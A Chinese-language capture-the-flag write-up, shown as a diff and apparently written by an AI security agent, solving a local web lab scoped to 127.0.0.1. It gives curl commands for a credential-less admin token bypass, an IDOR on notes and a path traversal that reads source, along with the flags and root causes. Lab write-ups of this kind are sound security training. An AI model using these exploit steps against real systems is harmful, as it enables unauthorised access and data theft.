@@ -1,0 +1,53 @@
+攻防链完成，全程仅访问 `http://127.0.0.1:18081`（scope 校验：`exact:http://127.0.0.1:18081` → allow）。
+
+## FLAG 原文
+
+```
+FLAG{api_chain_ok}
+FLAG{idor_user2}
+```
+
+- **`FLAG{api_chain_ok}`** —— 主 FLAG，admin token 链拿到：`/admin/config` 返回 `{"flag": "FLAG{api_chain_ok}", "debug": true}`
+- **`FLAG{idor_user2}`** —— IDOR 拿到，藏在 admin 私有 note 正文：`{"id":"2","note":"admin-secret-FLAG{idor_user2}"}`
+
+## 攻击链（curl 复现）
+
+```bash
+# 1) 弱认证：无凭据直接换发 uid=2(admin) 令牌
+TOK=$(curl -s 'http://127.0.0.1:18081/login?user=admin' | sed -E 's/.*"token": *"([^"]+)".*/\1/')
+# TOK=eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=  ->  {"uid": "2", "user": "admin"}
+
+# 2) 用 admin token 打 /admin/config → 200 + FLAG
+curl -s "http://127.0.0.1:18081/admin/config?token=$TOK"
+curl -s -H "Authorization: Bearer $TOK" http://127.0.0.1:18081/admin/config
+# {"flag": "FLAG{api_chain_ok}", "debug": true}
+
+# 3) IDOR：完全不校验 note 归属（连 token 都不需要）
+curl -s 'http://127.0.0.1:18081/notes?id=2'          # viewer=null
+curl -s 'http://127.0.0.1:18081/notes?id=2&token=<uid1>'  # viewer="1" → 身份已知仍不拦
+# {"id":"2","note":"admin-secret-FLAG{idor_user2}","viewer":null}
+
+# 4) 辅助：/files 路径穿越读源码，确认常量与校验缺陷
+curl -s 'http://127.0.0.1:18081/files?name=server.py'
+curl -s --path-as-is 'http://127.0.0.1:18081/files?name=../weblab-api/server.py'
+```
+
+**根因**
+1. `/login` 用明文 `user` 参数直接决定 `uid`（`user=admin → uid=2`），无任何凭据校验。
+2. `_auth_user()` 只做 `base64 → json.uid`，令牌无签名/无过期/无服务端会话，等价于客户端可自行伪造 `eyJ1dWQiOiAiMiJ9`。
+3. `/admin/config` 只比对 `uid != "2"`，负对照（uid=1 / 无 token）均 403，证明鉴权本身"有效但上游可绕"。
+4. `/notes` 拿到 `viewer` 身份后不做 `uid == note.owner` 比对 → IDOR。
+5. `/files` 直接 `os.path.join(dirname, name)`，路径穿越可读源码（500B 截断），泄露 `FLAG`/`NOTES` 常量与绝对路径。
+
+## 引用 E-id
+
+| E-id | 内容 |
+|---|---|
+| E-001 | case-open |
+| E-002 | `GET /` 枚举 + 官方 hint + 403 基线 + 路径泄露 |
+| E-003 | `/login?user=admin` 换发 uid=2 token（含 base64 解码与 uid=1 对照） |
+| E-004 | `/admin/config` 200 → `FLAG{api_chain_ok}`，含 query/header 两种传参与 403 负对照 |
+| E-005 | `/notes?id=2` IDOR → `FLAG{idor_user2}`，含 `viewer` 身份证据与 404 对照 |
+| E-006 | `/files` 路径穿越读 `server.py`，含 `FLAG = "FLAG{api_chain_ok}"`、`NOTES` 常量 |
+
+已 `record_finding` 两条结论，`CASE.md` 状态置 `solved`；证据文件在 `evidence/E-001…E-006`。
